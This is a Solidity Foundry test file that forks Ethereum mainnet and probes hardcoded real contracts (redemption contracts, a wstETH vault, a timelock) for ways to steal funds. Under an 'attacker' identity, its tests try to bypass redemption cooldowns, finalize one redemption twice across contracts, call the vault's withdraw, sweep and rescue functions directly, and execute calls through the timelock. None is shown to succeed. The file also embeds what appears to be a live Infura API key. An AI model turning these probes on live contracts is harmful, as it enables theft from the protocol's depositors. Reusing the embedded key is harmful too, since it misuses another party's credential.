// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

/**
 * EXISTING REDEMPTION HIJACK INVESTIGATION
 * Testing if we can hijack or use existing redemptions
 */
contract ExistingRedemptionHijack is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
    address constant IAU = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckR1DifferentCooldown() public {
        console.log("=== R1 COOLDOWN INVESTIGATION ===\n");

        // Check if R1 has a different cooldown period
        bytes32 slot4R0 = vm.load(R0, bytes32(uint256(4)));
        bytes32 slot4R1 = vm.load(R1, bytes32(uint256(4)));

        console.log("R0 slot 4 (contains cooldown):");
        console.logBytes32(slot4R0);

        console.log("R1 slot 4:");
        console.logBytes32(slot4R1);

        // Extract cooldown from R0
        uint256 cooldownR0 = (uint256(slot4R0) >> 96) & type(uint32).max;
        uint256 cooldownR1 = (uint256(slot4R1) >> 96) & type(uint32).max;

        console.log("R0 cooldown:", cooldownR0 / 86400, "days");
        console.log("R1 cooldown:", cooldownR1 / 86400, "days");

        if (cooldownR1 < cooldownR0) {
            console.log("*** R1 HAS SHORTER COOLDOWN! ***");
        }
    }

    function test_ScanForExistingRedemptions() public {
        console.log("=== SCANNING FOR EXISTING REDEMPTIONS ===\n");

        // Known addresses that might have interacted with protocol
        address[] memory knownAddresses = new address[](10);
        knownAddresses[0] = TIMELOCK;
        knownAddresses[1] = VAULT;
        knownAddresses[2] = RC;
        knownAddresses[3] = 0x5c6B0fA3fC98c3D8BBCF7c0a12B79bcDe58B5E8E; // Random whale
        knownAddresses[4] = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B; // Vitalik
        knownAddresses[5] = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8; // TASSET itself
        knownAddresses[6] = 0x551d155760ae96050439AD24Ae98A96c765d761B; // VAULT
        knownAddresses[7] = address(0); // Zero address
        knownAddresses[8] = address(1); // Address 1
        knownAddresses[9] = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510; // RC

        for (uint i = 0; i < knownAddresses.length; i++) {
            (bool s, bytes memory d) = R0.staticcall(
                abi.encodeWithSignature("getRedeemLength(address)", knownAddresses[i])
            );

            if (s) {
                uint256 len = abi.decode(d, (uint256));
                if (len > 0) {
                    console.log("Found %d redemptions for:", len);
                    console.logAddress(knownAddresses[i]);

                    // Check if any are ready
                    for (uint j = 0; j < len; j++) {
                        (bool rs, bytes memory rd) = R0.staticcall(
                            abi.encodeWithSignature("getRedeemRequest(address,uint256)", knownAddresses[i], j)
                        );
                        if (rs && rd.length > 0) {
                            console.log("  Redemption %d data:", j);
                            console.logBytes(rd);
                        }
                    }
                }
            }
        }
    }

    function test_R1RedemptionPath() public {
        console.log("=== R1 REDEMPTION PATH ===\n");

        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault initial:", vaultInitial / 1e18);

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R1, type(uint256).max);

        // Try to create redemption via R1
        console.log("Attempting redemption via R1...");
        (bool s1,) = R1.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("R1 redeem success:", s1);

        if (s1) {
            // Check redemption
            (bool s2, bytes memory d2) = R1.staticcall(
                abi.encodeWithSignature("getRedeemLength(address)", attacker)
            );
            if (s2) {
                console.log("R1 redemption count:", abi.decode(d2, (uint256)));
            }
        }

        vm.stopPrank();

        // Try immediate finalize via R1
        vm.startPrank(attacker);
        (bool s3,) = R1.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("R1 immediate finalize:", s3);
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        vm.stopPrank();
    }

    function test_CrossContractRedemption() public {
        console.log("=== CROSS-CONTRACT REDEMPTION ===\n");

        // Can we create redemption on R0 and finalize on R1?
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create on R0
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created redemption on R0");

        // Check on R0
        (bool s1, bytes memory d1) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (s1) {
            console.log("R0 redemption count:", abi.decode(d1, (uint256)));
        }

        // Check on R1
        (bool s2, bytes memory d2) = R1.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (s2) {
            console.log("R1 redemption count:", abi.decode(d2, (uint256)));
        }

        vm.stopPrank();

        // Wait
        vm.warp(block.timestamp + 7 days + 1);

        // Finalize on R1
        vm.startPrank(attacker);
        (bool s3,) = R1.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Finalize via R1:", s3);
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        vm.stopPrank();

        // Finalize on R0
        vm.startPrank(attacker);
        (bool s4,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Finalize via R0:", s4);
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        vm.stopPrank();
    }

    function test_RCDirectRedeem() public {
        console.log("=== RC DIRECT REDEEM ===\n");

        // RC.redeem(amount, to) - does this bypass cooldown?
        deal(TASSET, attacker, 10000e18);

        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        // Call RC.redeem directly
        console.log("Calling RC.redeem(1000e18, attacker)...");
        (bool s1,) = RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker));
        console.log("Success:", s1);

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("*** DIRECT RC REDEEM WORKS! ***");
        }

        vm.stopPrank();
    }

    function test_CheckIAUContract() public {
        console.log("=== IAU CONTRACT INVESTIGATION ===\n");

        // IAU at 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a
        console.log("IAU address:", IAU);
        console.log("IAU code size:", IAU.code.length);

        if (IAU.code.length == 0) {
            console.log("IAU HAS NO CODE - potential CREATE2 deployment");

            // Could we deploy something at this address?
            // Check what RC expects from IAU

            // Read RC's storage to understand IAU's role
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(RC, bytes32(i));
                console.log("RC slot %d:", i);
                console.logBytes32(slot);
            }
        }
    }

    function test_VaultDirectWithdraw() public {
        console.log("=== VAULT DIRECT WITHDRAW ===\n");

        // Can we call Vault directly to withdraw?
        console.log("Vault:", VAULT);
        console.log("Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        // Try various withdrawal functions
        vm.startPrank(attacker);

        // withdraw(amount)
        (bool s1,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256)", 1000e18));
        console.log("withdraw(amount):", s1);

        // withdraw(amount, to)
        (bool s2,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker));
        console.log("withdraw(amount,to):", s2);

        // transfer(to, amount)
        (bool s3,) = VAULT.call(abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18));
        console.log("transfer:", s3);

        // sweep(token, to)
        (bool s4,) = VAULT.call(abi.encodeWithSignature("sweep(address,address)", wstETH, attacker));
        console.log("sweep:", s4);

        // rescue(token)
        (bool s5,) = VAULT.call(abi.encodeWithSignature("rescue(address)", wstETH));
        console.log("rescue:", s5);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_TimelockExecution() public {
        console.log("=== TIMELOCK EXECUTION ===\n");

        // Can we execute via timelock?
        console.log("Timelock:", TIMELOCK);

        // Check timelock pending transactions
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(TIMELOCK, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Timelock slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Try to execute arbitrary call
        vm.startPrank(attacker);

        // execute(target, value, data, predecessor, salt)
        bytes memory withdrawCall = abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker);
        (bool s1,) = TIMELOCK.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes,bytes32,bytes32)",
                VAULT,
                0,
                withdrawCall,
                bytes32(0),
                bytes32(0)
            )
        );
        console.log("Timelock execute:", s1);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_DeployIAUContract() public {
        console.log("=== DEPLOY IAU CONTRACT ===\n");

        // If we can deploy at IAU address, what could we do?
        // First, check what RC expects from IAU

        // Scan RC's code for references to IAU
        console.log("RC code size:", RC.code.length);

        // Assuming IAU might be used for something like:
        // - Authorization
        // - Price oracle
        // - State validation

        // We can't actually deploy at an arbitrary address, but let's see
        // what CREATE2 parameters would be needed

        // Check if there's a factory that could deploy to IAU
        bytes32 rcSlot5 = vm.load(RC, bytes32(uint256(5)));
        console.log("RC slot 5 (potential IAU ref):");
        console.logBytes32(rcSlot5);

        address potentialIAU = address(uint160(uint256(rcSlot5)));
        console.log("Potential IAU:", potentialIAU);
        console.log("Matches known IAU:", potentialIAU == IAU);
    }

    function test_StorageSlotAnalysis() public {
        console.log("=== R0 FULL STORAGE ANALYSIS ===\n");

        // Analyze R0's storage completely
        console.log("R0:", R0);

        // Check all slots up to 20
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(R0, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("R0 slot %d:", i);
                console.logBytes32(slot);
            }
        }

        // Check EIP-1967 slots
        bytes32 implSlot = vm.load(R0, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        bytes32 adminSlot = vm.load(R0, bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));

        console.log("\nEIP-1967:");
        console.log("Implementation slot:");
        console.logBytes32(implSlot);
        console.log("Admin slot:");
        console.logBytes32(adminSlot);

        address impl = address(uint160(uint256(implSlot)));
        address admin = address(uint160(uint256(adminSlot)));

        console.log("Implementation:", impl);
        console.log("Admin:", admin);
    }
}
